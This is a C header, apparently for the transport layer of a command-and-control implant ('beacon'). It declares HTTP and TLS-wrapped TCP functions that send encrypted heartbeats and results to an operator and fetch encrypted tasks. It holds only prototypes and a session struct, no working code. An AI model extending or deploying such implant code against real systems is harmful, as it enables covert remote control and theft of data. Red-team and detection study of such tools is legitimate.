#pragma once

#include "beacon_common.h"
#include "beacon_profile.h"

#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <security.h>
#include <schannel.h>

/*
 * HTTP transform 交换：每次请求都发送 encrypted_heartbeat metadata，可选发送 encrypted_result。
 * encrypted_tasks 返回已按 server.output 解码后的任务密文。
 */
INT TransportHttpTransformExchange(const Profile* profile,
                                   const ByteBuf* encrypted_heartbeat,
                                   const ByteBuf* encrypted_result,
                                   ByteBuf* encrypted_tasks);

/* TCP external 传输：长度前缀帧，payload 为已加密心跳。 */
typedef struct TcpExternalSession {
    SOCKET sock;
    INT tls_enabled;
    INT tls_ready;
    INT tls_have_cred;
    CredHandle tls_cred;
    CtxtHandle tls_ctx;
    SecPkgContext_StreamSizes tls_sizes;
    ByteBuf tls_cipher_extra;
    ByteBuf tls_plain_extra;
} TcpExternalSession;

VOID TransportTcpExternalInit(TcpExternalSession* session);
VOID TransportTcpExternalClose(TcpExternalSession* session);
INT TransportTcpExternalConnect(const Profile* profile, TcpExternalSession* session);
INT TransportTcpExternalExchange(TcpExternalSession* session, const ByteBuf* payload, ByteBuf* response);
